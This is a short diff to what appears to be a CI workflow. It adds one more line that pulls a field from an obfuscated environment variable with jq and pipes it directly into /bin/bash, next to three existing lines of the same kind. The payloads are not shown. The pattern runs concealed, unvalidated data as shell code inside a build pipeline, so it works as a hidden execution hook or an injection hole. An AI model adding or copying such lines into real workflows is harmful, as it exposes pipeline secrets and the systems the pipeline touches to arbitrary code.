@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$tlbx400" | jq -r .hngah69 | /bin/bash
           printf '%s' "$pkngf7" | jq -r .vhtxi607 | /bin/bash
           printf '%s' "$o03086" | jq -r .per799 | /bin/bash
+          echo $jjvft003 | jq -r .i30308 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
